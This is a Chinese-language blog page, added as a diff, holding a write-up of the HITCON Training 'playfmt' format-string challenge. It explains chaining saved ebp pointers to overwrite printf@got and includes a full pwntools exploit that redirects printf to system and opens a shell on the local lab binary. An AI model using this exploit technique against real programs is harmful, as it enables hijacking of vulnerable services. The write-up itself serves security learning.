@@ -1,0 +1,1071 @@
+
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="stack,formating_string," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Chivalry" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="格式化字符串漏洞">
+<meta name="keywords" content="stack, formating_string">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lab9_playfmt">
+<meta property="og:url" content="http://localhost:4000/hitcon_trainning/2019/07/11/playfmt/">
+<meta property="og:site_name" content="Chivalry">
+<meta property="og:description" content="格式化字符串漏洞">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190713103412691.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019071310343141.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190713103441692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjY3MzE2,size_16,color_FFFFFF,t_70">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="lab9_playfmt">
+<meta name="twitter:description" content="格式化字符串漏洞">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190713103412691.png">
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://localhost:4000/"/>
+
+
+
+
+
+  <title>lab9_playfmt | Chivalry</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chivalry</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+<div id="posts" class="posts-expand">
+  
+  
+
+  
+
+  
+  
+  
+
+  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/hitcon_trainning/2019/07/11/playfmt/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cyth">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="assets/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chivalry">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+          
+          
+            lab9_playfmt
+          
+        </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-11T00:00:00+08:00">
+                2019-07-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/#/hitcon_trainning" itemprop="url" rel="index">
+                    <span itemprop="name">hitcon_trainning</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+            
+                <div class="post-description">
+                    
+                </div>
+            
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <h1 id="格式化字符串漏洞">格式化字符串漏洞</h1>
+
+<p>格式化字符串漏洞的两个利用方式</p>
+
+<ul>
+  <li>泄露栈上内容</li>
+  <li>改写某地址内容（前提是这个地址要在栈上，也就是printf可控的地方）</li>
+</ul>
+
+<p>原理是<strong>用格式化字符串对栈上的相对而言的参数进行解析</strong>。</p>
+
+<blockquote>
+  <p>如果用的%k$p、%k$x等就是打印出来相对printf的第几个参数；<br />
+%s可以打印栈上地址指向的内容（等会用这个打印printf@got），也可以用来破坏程序；<br />
+%n可以向地址类参数指向的地方写入内容。</p>
+</blockquote>
+
+<hr />
+
+<h1 id="思路">思路</h1>
+
+<p>一开始就是没有思路，太菜了，真的太菜了TAT。<br />
+<img src="https://img-blog.csdnimg.cn/20190713103412691.png" alt="在这里插入图片描述" /><br />
+这里的buf是在bss段，也就是意味着没有办法用常规方法做。<br />
+看了<a href="https://www.jianshu.com/p/2cae38284bff">大佬的wp</a>才知道可以控制ebp来实现地址任意写。<br />
+但是我觉得或许用栈迁移也可以试一下。<br />
+先写一波控制ebp！</p>
+
+<h2 id="为什么buf在bss段就没法用常规方法">为什么buf在bss段就没法用常规方法？</h2>
+<ul>
+  <li>常规方法是利用栈上内容可写，将其写为某个地址，然后用%k$n这样的方式把这个地址指向的内容改掉。 而现在buf没法通过直接写入来控制栈上的地址。</li>
+</ul>
+
+<h2 id="控制ebp"><strong>控制ebp</strong></h2>
+
+<p>现在关键是要找到栈上哪些位置里面的内容是地址而且是可以控制栈上别的位置的内容的，以此来写入我们的目的地址。这个地方就是ebp。</p>
+
+<p>ebp本来就是用来保存之前的ebp的内容。比如我们设想一个情况：</p>
+<blockquote>
+  <p>ebp_1是相对printf的<strong>第6个参数</strong>，里面存着ebp_2的地址;</p>
+
+  <p>ebp_2是相对printf的<strong>第10个参数</strong>;</p>
+
+  <p>格式化字符串漏洞就可以通过 <strong>%6$n</strong>改写ebp_2指向别的地方。</p>
+</blockquote>
+
+<p>改写过后，ebp_2内就是栈上另外位置的地址，我们假设他是fmt_7，是相对于printf的<strong>第7个参数</strong>。</p>
+
+<blockquote>
+  <p><strong>%10$n</strong> 就可以让fmt_7指向printf@got。</p>
+
+  <p><strong>%7$s</strong> 就可以打印出printf@got的内容</p>
+</blockquote>
+
+<p>从而计算出system的真实地址。 <br />
+用 <strong>%7$n</strong>就可以直接改写printf@got为system的地址，接下来再调用printf就是调用system了。</p>
+
+<p>但是有一个问题，%k$<strong>n</strong>一用就炸，也就是说我们起码要用<strong>hn</strong>，在找fmt_7的时候要求其内容的前两个字节和got表的前两个字节是相同的。<br />
+并且在改写printf@got的时候，至少要把它分为两次写进去，那么我们就还要有一个地方指向printf@got+2，这个地址的要求和fmt_7是一样的。</p>
+
+<p><img src="https://img-blog.csdnimg.cn/2019071310343141.png" alt="在这里插入图片描述" />
+<img src="https://img-blog.csdnimg.cn/20190713103441692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjY3MzE2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" /></p>
+
+<h1 id="exp">exp</h1>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37<br/>38<br/>39<br/>40<br/>41<br/>42<br/>43<br/>44<br/>45<br/>46<br/>47<br/>48<br/>49<br/>50<br/>51<br/>52<br/>53<br/>54<br/>55<br/>56<br/>57<br/>58<br/>59<br/>60<br/>61<br/>62<br/>63<br/>64<br/>65<br/>66<br/>67<br/>68<br/>69<br/>70<br/>71<br/>72<br/>73<br/>74<br/>75<br/>76<br/>77<br/>78<br/>79<br/>80<br/>81<br/>82<br/>83<br/>84<br/>85<br/>86<br/>87<br/>88<br/>89<br/>90<br/>91<br/>92<br/>93<br/>94<br/>95<br/>96<br/>97<br/>98<br/>99<br/>100<br/>101<br/>102<br/>103<br/>104<br/>105<br/>106<br/>107<br/>108<br/>109<br/>110<br/>111<br/>112<br/>113<br/>114<br/>115<br/>116<br/>117<br/>118<br/>119<br/>120<br/>121<br/>122<br/>123<br/>124<br/>125<br/>126<br/>127<br/>128<br/>129<br/>130<br/>131<br/>132<br/>133<br/>134<br/>135<br/>136<br/>137<br/>138<br/>139<br/>140<br/>141</pre></td><td class="code"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'debug'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'deepin-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">,</span> <span class="s">'sh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>
+
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./playfmt'</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./playfmt'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="c">#gdb.attach(sh)</span>
+
+<span class="c">#-----------------address prepare----------------</span>
+
+<span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
+<span class="n">printf_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
+<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="si">%6</span><span class="s">$x'</span><span class="p">)</span>
+
+<span class="n">ebp_2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fmt_7</span> <span class="o">=</span> <span class="n">ebp_2</span><span class="o">-</span><span class="mh">0xc</span>
+<span class="n">fmt_11</span> <span class="o">=</span> <span class="n">ebp_2</span><span class="o">+</span><span class="mh">0x4</span>
+<span class="n">ebp_1</span> <span class="o">=</span> <span class="n">fmt_7</span><span class="o">-</span><span class="mh">0x4</span>
+
+<span class="c">#-----------------ebp_2--&gt;fmt_7--------------------</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="si">%</span><span class="s">'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt_7</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span><span class="o">+</span><span class="s">'c</span><span class="si">%6</span><span class="s">$hn</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+
+<span class="s">'''
+这里的一段while，是因为</span><span class="si">%</span><span class="s">kc输出的实在太多了
+recv()每次只能接受0x1000的内容
+如果没有循环的话会卡住。
+用一个标识符做接受完成标志
+至于为什么这里每次都要sendline('yes!')
+因为他可能前面的输出加上'ye'刚好就是0x100,后面就会因为只有's!'而没法跳出循环，就卡死了
+[↑血的教训=皿=]
+sleep(0.1)是两个sendline之间的常规操作来应对玄学问题[我猜的]。
+'''</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">break</span>
+
+
+
+<span class="c">#-----------------fmt_7--&gt;printf@got----------------</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="si">%</span><span class="s">'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">printf_got</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span><span class="o">+</span><span class="s">'c</span><span class="si">%10</span><span class="s">$hn</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">break</span>
+
+
+<span class="c">#-----------------ebp_2--&gt;fmt_11--------------------</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="si">%</span><span class="s">'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">fmt_11</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">+</span> <span class="s">'c</span><span class="si">%6</span><span class="s">$hn</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">break</span>
+
+<span class="c">#-----------------fmt_11--&gt;printf@got+2---------------</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="si">%</span><span class="s">'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">((</span><span class="n">printf_got</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">+</span><span class="s">'c</span><span class="si">%10</span><span class="s">$hn</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">break</span>
+<span class="c">#-----------------calculate system address-------------</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'</span><span class="si">%7</span><span class="s">$s'</span><span class="p">)</span>
+<span class="n">printf_elf</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+
+<span class="n">system_elf</span> <span class="o">=</span> <span class="n">printf_elf</span><span class="o">-</span><span class="n">printf_libc</span><span class="o">+</span><span class="n">system_libc</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'************{:#x}***********'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">system_elf</span><span class="p">))</span>
+
+<span class="c">#----------------change global offset table------------</span>
+
+<span class="n">addr_1</span> <span class="o">=</span> <span class="n">system_elf</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+<span class="n">addr_2</span> <span class="o">=</span> <span class="n">system_elf</span><span class="o">&gt;&gt;</span><span class="mi">16</span>
+
+<span class="s">'''
+这里是防止addr_2比addr_1小
+嘻嘻，从师傅那里偷学的方法=v=
+'''</span>
+
+<span class="n">ls</span><span class="o">=</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="n">addr_1</span><span class="p">,</span><span class="n">addr_2</span><span class="p">]</span>
+<span class="n">ls</span><span class="o">.</span><span class="n">sort</span><span class="p">()</span>
+<span class="n">lis</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="n">addr_1</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span><span class="n">addr_2</span><span class="p">:</span><span class="mi">11</span><span class="p">}</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="s">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="si">%</span><span class="s">'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">ls</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-</span><span class="n">ls</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span> <span class="o">+</span> <span class="s">'c</span><span class="si">%</span><span class="s">'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">lis</span><span class="p">[</span><span class="n">ls</span><span class="p">[</span><span class="n">i</span><span class="p">]])</span> <span class="o">+</span> <span class="s">'$n'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'************{}***********'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'yes!'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">break</span>
+
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></tbody></table></div></div>
+<hr />
+<h1 id="栈迁移"><strong>栈迁移</strong></h1>
+
+<p>这个思路按理是可以的，把do_fmt的返回地址改成read的，按照常规栈迁移的套路来，然后用read做栈溢出，输入quit就可以开始栈迁移。但是ebp_1怎么变是一个问题，%k$n的输出太长了会炸是另一个问题，好麻烦啊。不想写了。【可能这就是我咸鱼的原因。】</p>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            
+            <a href="/tag/#/stack" rel="tag"># stack</a>
+          
+            
+            <a href="/tag/#/formating_string" rel="tag"># formating_string</a>
+          
+        </div>
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/hitcon_trainning/2019/07/13/hacknote/" rel="next" title="lab10_hacknote">
+                <i class="fa fa-chevron-left"></i> lab10_hacknote
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/hitcon_trainning/2019/07/11/crack/" rel="prev" title="lab7_crack">
+                lab7_crack <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+      
+
+      
+    </footer>
+  </article>
+
+  <div class="post-spread">
+    
+  </div>
+</div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        
+        
+        
+
+
+
+
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/assets/images/avatar.gif"
+               alt="Cyth" />
+          <p class="site-author-name" itemprop="name">Cyth</p>
+           
+              <p class="site-description motion-element" itemprop="description">认真勤奋就会有回报的赤诚。</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/">
+                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+        
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#格式化字符串漏洞"> <span class="nav-number">1</span> <span class="nav-text">格式化字符串漏洞</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#思路"> <span class="nav-number">2</span> <span class="nav-text">思路</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#为什么buf在bss段就没法用常规方法"> <span class="nav-number">2.1</span> <span class="nav-text">为什么buf在bss段就没法用常规方法？</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#控制ebp"> <span class="nav-number">2.2</span> <span class="nav-text">控制ebp</strong</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#exp"> <span class="nav-number">3</span> <span class="nav-text">exp</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#栈迁移"> <span class="nav-number">4</span> <span class="nav-text">栈迁移</strong</span> </a> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cyth</span>
+</div>
+
+
+<div class="powered-by">
